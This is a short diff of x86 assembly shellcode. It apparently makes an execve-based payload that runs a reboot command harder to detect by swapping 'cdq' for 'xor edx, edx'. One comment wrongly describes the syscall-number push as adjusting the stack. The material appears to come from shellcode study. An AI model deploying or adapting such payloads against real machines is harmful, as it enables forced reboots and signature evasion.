@@ -10,9 +10,7 @@ section .text
 _start:
   push 0xb                         ; adjust the size of the stack
   pop eax
-  cdq                              ; cltd converts the signed long in EAX to a signed double long in EDX:EAX
-                                   ; by extending the most-significant bit (sign bit) of EAX into all bits of EDX.
-                                   ; Thus we zero out EDX
+  xor edx, edx
   push edx                         ; null string terminator
   mov dword [esp-0x4], 0x746f6f62  ; toob
   mov dword [esp-0x8], 0x65722f6e  ; er/n
